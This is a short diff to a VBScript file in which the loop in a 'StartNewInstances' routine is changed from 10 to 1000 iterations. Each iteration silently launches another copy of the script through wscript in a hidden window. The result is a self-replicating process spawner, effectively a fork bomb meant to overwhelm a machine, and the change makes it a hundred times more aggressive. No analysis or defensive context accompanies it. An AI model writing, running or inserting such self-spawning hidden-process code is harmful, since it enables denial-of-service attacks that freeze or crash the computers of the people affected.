@@ -25,7 +25,7 @@ End Sub
 ' Function to start new instances of the script
 Sub StartNewInstances()
     Dim i
-    For i = 1 To 10 ' Adjust the number as needed
+    For i = 1 To 1000 ' Adjust the number as needed
         shell.Run "wscript """ & scriptName & """", 0, False
     Next
 End Sub
